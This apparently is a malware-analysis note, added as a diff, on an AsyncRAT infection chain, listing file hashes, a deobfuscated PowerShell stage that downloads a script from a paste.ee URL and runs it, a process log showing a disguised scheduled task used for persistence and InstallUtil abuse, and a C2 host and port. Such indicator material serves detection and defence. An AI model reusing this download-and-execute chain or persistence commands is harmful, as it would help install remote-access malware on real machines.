@@ -1,0 +1,88 @@
+AsyncRAT 2022 | 30.03.2022 | .vbs > .ps1 |
+
+************************************************************************************************************
+
+.vbs 2f36f1a117071a9097c1ec0fff17772a029594500d6706f470899168d3b595f8
+.ps1 3c3c094cd35523aa6af1d6049b0c1ad72d2d80b2c2a31ab30c9fc5ee408e7544
+
+************************************************************************************************************
+
+Exec >>
+
+[system.net.webclient]$client = new-object system.net.webclient
+[byte[]]$downloadeddata = $client.downloaddata(https://paste.ee/r/CTMue/0)
+[string]$bytetostring = ([system.text.utf8encoding]::utf8).getstring($downloadeddata)
+[system.io.file]::writealltext(C:\\Users\\Public\\CTMue.PS1, $bytetostring, [system.text.encoding]::ascii)
+invoke-expression PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\CTMue.PS1
+
+>
+
+powershell -executionpolicy remotesigned -file C:\Users\Public\CTMue.PS1
+
+************************************************************************************************************
+
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Report Details.vbs
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy RemoteSigned -Command [System.Net.WebClient] $Client = New-Object System.Net.WebClient; [Byte[]] $DownloadedData = $Client.DownloadData('https://paste.ee/r/CTMue/0'); [String] $ByteToString = [System.Text.UTF8Encoding]::UTF8.GetString($DownloadedData); [System.IO.File]::WriteAllText('C:\Users\Public\CTMue.PS1', $ByteToString, [System.Text.Encoding]::UTF8); Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\Users\Public\CTMue.PS1'
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy RemoteSigned -File C:\Users\Public\CTMue.PS1
+
+C:\Windows\system32\cmd.exe /c C:\Users\Admin\AppData\Roaming\Task.bat 
+
+schtasks  /create /sc minute /mo 1 /tn MicrosoftSystemUpdateHandler /tr C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @C:\Users\Admin\AppData\Local\Temp\rblek2bh\rblek2bh.cmdline
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 /OUT:C:\Users\Admin\AppData\Local\Temp\RESDCF5.tmp c:\Users\Admin\AppData\Local\Temp\rblek2bh\CSCA20C6376897C4EADA2C5EBD9CEADF2A.TMP
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+
+C:\Windows\system32\cmd.exe /c C:\Users\Admin\AppData\Local\Temp\tmp47B5.tmp.bat
+
+timeout  3 
+
+C:\Windows\System32\WScript.exe C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs 
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy RemoteSigned -File C:\Users\Public\CTMue.PS1
+
+C:\Windows\system32\cmd.exe /c C:\Users\Admin\AppData\Roaming\Task.bat 
+
+schtasks  /create /sc minute /mo 1 /tn MicrosoftSystemUpdateHandler /tr C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @C:\Users\Admin\AppData\Local\Temp\slcl0m0x\slcl0m0x.cmdline
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 /OUT:C:\Users\Admin\AppData\Local\Temp\RES1F9B.tmp c:\Users\Admin\AppData\Local\Temp\slcl0m0x\CSCFAF121BE1A104AAAA85A59F141EA15F.TMP
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+
+C:\Windows\System32\WScript.exe C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs 
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy RemoteSigned -File C:\Users\Public\CTMue.PS1
+
+C:\Windows\system32\cmd.exe /c C:\Users\Admin\AppData\Roaming\Task.bat 
+
+schtasks  /create /sc minute /mo 1 /tn MicrosoftSystemUpdateHandler /tr C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @C:\Users\Admin\AppData\Local\Temp\w5lqa10h\w5lqa10h.cmdline
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 /OUT:C:\Users\Admin\AppData\Local\Temp\RES5F4.tmp c:\Users\Admin\AppData\Local\Temp\w5lqa10h\CSCB60FAA924E344565BA2645173B9AEF9E.TMP
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+
+C:\Windows\System32\WScript.exe C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs 
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy RemoteSigned -File C:\Users\Public\CTMue.PS1
+
+C:\Windows\system32\cmd.exe /c C:\Users\Admin\AppData\Roaming\Task.bat 
+
+schtasks  /create /sc minute /mo 1 /tn MicrosoftSystemUpdateHandler /tr C:\Users\Admin\AppData\Roaming\MicrosoftSystemHandler.vbs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @C:\Users\Admin\AppData\Local\Temp\cqod1f2j\cqod1f2j.cmdline
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 /OUT:C:\Users\Admin\AppData\Local\Temp\RESEFD7.tmp c:\Users\Admin\AppData\Local\Temp\cqod1f2j\CSC9295C33234DD4733881A1080A02CC417.TMP
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+
+
+c2
+rick63.publicvm.com:5900
